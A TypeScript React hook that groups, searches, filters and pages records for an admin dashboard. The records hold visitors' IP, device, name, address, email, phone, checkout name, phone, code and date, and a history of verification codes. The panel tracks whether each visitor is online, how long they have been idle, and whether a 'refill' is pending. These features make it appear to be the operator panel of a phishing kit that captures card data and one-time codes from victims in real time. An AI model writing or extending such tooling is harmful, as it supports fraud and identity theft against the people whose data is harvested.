import { useMemo } from 'react';
import type { FilterKey, FlatRow, Group, RecordRow, SortKey } from '../types';
import { compareRecordIdDesc, formatVerifyMethod, isSubId, mainIdOf, safeText, statusCategory } from '../utils/adminFormatters';

type UseAdminRowsOptions = {
  records: RecordRow[];
  sortBy: SortKey;
  q: string;
  filter: FilterKey;
  onlyMain: boolean;
  onlyOnline: boolean;
  onlyCurrent: boolean;
  collapsedMain: Record<string, boolean>;
  expandAll: boolean;
  page: number;
  pageSize: number;
};

function buildSearchBlob(record: RecordRow) {
  const verifyHistoryText = Array.isArray(record.verifyHistory)
    ? record.verifyHistory.map((item) => `${safeText(item?.value)} ${safeText(item?.time)}`).join(' ')
    : '';

  return [
    record.id,
    record.time,
    record.ip,
    record.deviceType,
    record.deviceOS,
    record.fullname,
    record.address,
    record.fulladdress,
    record.city,
    record.state,
    record.postalcode,
    record.email,
    record.telephone,
    record.status,
    record.page,
    record.checkoutName,
    record.checkoutPhone,
    record.checkoutCode,
    record.checkoutDate,
    record.verifyMethod,
    formatVerifyMethod(record.verifyMethod),
    record.verify,
    verifyHistoryText,
    record.emailVerify,
    record.appCheck,
  ]
    .filter(Boolean)
    .join(' ')
    .toLowerCase();
}

export function useAdminRows({
  records,
  sortBy,
  q,
  filter,
  onlyMain,
  onlyOnline,
  onlyCurrent,
  collapsedMain,
  expandAll,
  page,
  pageSize,
}: UseAdminRowsOptions) {
  const grouped = useMemo(() => {
    const map = new Map<number, Group>();

    for (const record of records) {
      const mainId = mainIdOf(record.id);
      if (!map.has(mainId)) {
        map.set(mainId, { mainId, subs: [] });
      }

      const group = map.get(mainId)!;
      if (isSubId(record.id)) {
        group.subs.push(record);
      } else {
        group.main = record;
      }
    }

    for (const group of map.values()) {
      group.subs.sort((a, b) => compareRecordIdDesc(a.id, b.id));
    }

    return [...map.values()].sort((a, b) => {
      if (sortBy === 'recent_activity') {
        const aLast = Math.max(a.main?.updatedAt || 0, ...a.subs.map((item) => item.updatedAt || 0));
        const bLast = Math.max(b.main?.updatedAt || 0, ...b.subs.map((item) => item.updatedAt || 0));
        if (aLast !== bLast) return bLast - aLast;
      }
      return b.mainId - a.mainId;
    });
  }, [records, sortBy]);

  const searchBlobByRecord = useMemo(() => {
    const map = new Map<RecordRow, string>();
    for (const record of records) {
      map.set(record, buildSearchBlob(record));
    }
    return map;
  }, [records]);

  const normalizedKeyword = q.trim().toLowerCase();

  const rows = useMemo(() => {
    const now = Date.now();
    const out: FlatRow[] = [];

    const hit = (record: RecordRow) => {
      if (!normalizedKeyword) return true;
      return (searchBlobByRecord.get(record) || '').includes(normalizedKeyword);
    };

    const quickFilter = (main: RecordRow, subs: RecordRow[]) => {
      const category = statusCategory(main.status);
      const isOffline = main.online === false;
      const hasCurrent = Boolean(main.active) || subs.some((item) => Boolean(item.active));
      const idleMs = now - (main.updatedAt || now);
      const inProgress = !isOffline && (category === 'progress' || (idleMs < 30_000 && category !== 'submitted'));
      const needsAction =
        category === 'refill' || (!isOffline && idleMs > 180_000 && category !== 'submitted') || (isOffline && category !== 'submitted');

      if (onlyOnline && isOffline) return false;
      if (onlyCurrent && !hasCurrent) return false;

      switch (filter) {
        case 'needs_action':
          return needsAction;
        case 'in_progress':
          return inProgress;
        case 'submitted':
          return category === 'submitted';
        case 'offline':
          return isOffline;
        case 'refills':
          return subs.length > 0;
        default:
          return true;
      }
    };

    for (const group of grouped) {
      const main = group.main;
      if (!main) continue;

      const subs = group.subs || [];
      if (!quickFilter(main, subs)) continue;

      const subMatches = subs.filter(hit);
      const mainMatches = hit(main);
      if (!mainMatches && subMatches.length === 0) continue;

      out.push({ r: main, indent: false, mainId: group.mainId, subsCount: subs.length });
      if (onlyMain) continue;

      const collapsed = collapsedMain[group.mainId.toString()] ?? !expandAll;
      if (collapsed) continue;

      for (const subRow of subMatches) {
        out.push({ r: subRow, indent: true, mainId: group.mainId, subsCount: subs.length });
      }
    }

    return out;
  }, [collapsedMain, expandAll, filter, grouped, normalizedKeyword, onlyCurrent, onlyMain, onlyOnline, searchBlobByRecord]);

  const filterCounts = useMemo(() => {
    const now = Date.now();
    let needsAction = 0;
    let inProgress = 0;
    let submitted = 0;
    let offline = 0;
    let refills = 0;
    let all = 0;

    for (const group of grouped) {
      const main = group.main;
      if (!main) continue;

      all += 1;
      const category = statusCategory(main.status);
      const isOffline = main.online === false;
      const idleMs = now - (main.updatedAt || now);
      const isInProgress = !isOffline && (category === 'progress' || (idleMs < 30_000 && category !== 'submitted'));
      const isNeedsAction =
        category === 'refill' || (!isOffline && idleMs > 180_000 && category !== 'submitted') || (isOffline && category !== 'submitted');

      if (isNeedsAction) needsAction += 1;
      if (isInProgress) inProgress += 1;
      if (category === 'submitted') submitted += 1;
      if (isOffline) offline += 1;
      if (group.subs.length > 0) refills += 1;
    }

    return {
      needs_action: needsAction,
      in_progress: inProgress,
      submitted,
      offline,
      refills,
      all,
    };
  }, [grouped]);

  const totalRows = rows.length;
  const totalPages = Math.max(1, Math.ceil(totalRows / pageSize));
  const safePage = Math.min(page, totalPages);
  const pageStart = (safePage - 1) * pageSize;
  const pagedRows = useMemo(() => rows.slice(pageStart, pageStart + pageSize), [pageSize, pageStart, rows]);

  return {
    grouped,
    rows,
    filterCounts,
    totalRows,
    totalPages,
    safePage,
    pageStart,
    pagedRows,
  };
}
